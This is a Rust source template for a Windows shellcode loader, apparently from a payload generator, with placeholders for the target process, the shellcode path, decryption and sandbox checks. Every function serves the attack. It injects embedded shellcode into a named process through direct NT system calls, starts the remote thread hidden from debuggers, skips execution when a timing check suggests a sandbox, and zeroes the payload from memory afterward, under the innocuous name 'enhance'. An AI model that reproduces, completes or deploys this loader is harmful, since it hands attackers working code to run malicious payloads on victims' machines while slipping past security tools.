#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]

use sysinfo::System;
use std::include_bytes;
use std::ptr::null_mut;
use core::ffi::c_void;

use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
};

use std::time::Instant;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

type HANDLE = *mut c_void;

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
const HIDE_FROM_DEBUGGER: u32 = 0x4;

#[repr(C)]
#[derive(Default)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: HANDLE,
    ObjectName: *mut c_void,
    Attributes: u32,
    SecurityDescriptor: *mut c_void,
    SecurityQualityOfService: *mut c_void,
}

#[repr(C)]
struct CID {
    proc_id: HANDLE,
    thread_id: HANDLE,
}

#[inline]
fn nt_success(s: i32) -> bool { s >= 0 }

{{NT_CALL_MACRO}}

fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    let tar_lower = tar.to_lowercase();
    for (_, pro) in s.processes() {
        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
        }
    }
    dom
}

fn pause(ms: i64) {
    let interval: i64 = -(ms * 10_000);
    let _ = ntcall!("NtDelayExecution", 0u32, &interval as *const i64);
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle: HANDLE = null_mut();
    let mut oa = OBJECT_ATTRIBUTES::default();
    oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
    let mut ci = CID {
        proc_id: tar as HANDLE,
        thread_id: null_mut(),
    };

    let s = ntcall!("NtOpenProcess",
        &mut process_handle as *mut HANDLE,
        PROCESS_ALL_ACCESS,
        &mut oa as *mut OBJECT_ATTRIBUTES,
        &mut ci as *mut CID,
    );
    if !nt_success(s) { return; }

    pause(150);

    let mut base: *mut c_void = null_mut();
    let mut size: usize = buf.len();
    let s = ntcall!("NtAllocateVirtualMemory",
        process_handle,
        &mut base as *mut *mut c_void,
        0usize,
        &mut size as *mut usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if !nt_success(s) { return; }

    pause(200);

    let buf_len = buf.len();
    let mut written: usize = 0;
    let s = ntcall!("NtWriteVirtualMemory",
        process_handle,
        base,
        buf.as_mut_ptr() as *mut c_void,
        buf_len,
        &mut written as *mut usize,
    );
    if !nt_success(s) { return; }

    wipe(&mut buf);
    pause(150);

    let mut old_protect: u32 = 0;
    let mut region_size = buf_len;
    let s = ntcall!("NtProtectVirtualMemory",
        process_handle,
        &mut base as *mut *mut c_void,
        &mut region_size as *mut usize,
        PAGE_EXECUTE_READ,
        &mut old_protect as *mut u32,
    );
    if !nt_success(s) { return; }

    pause(100);

    let mut th: HANDLE = null_mut();
    let _ = ntcall!("NtCreateThreadEx",
        &mut th as *mut HANDLE,
        THREAD_ALL_ACCESS,
        null_mut::<c_void>(),
        process_handle,
        base,
        null_mut::<c_void>(),
        HIDE_FROM_DEBUGGER,
        0usize,
        0usize,
        0usize,
        null_mut::<c_void>(),
    );
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = {{FN_FIND_PID}}(tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}
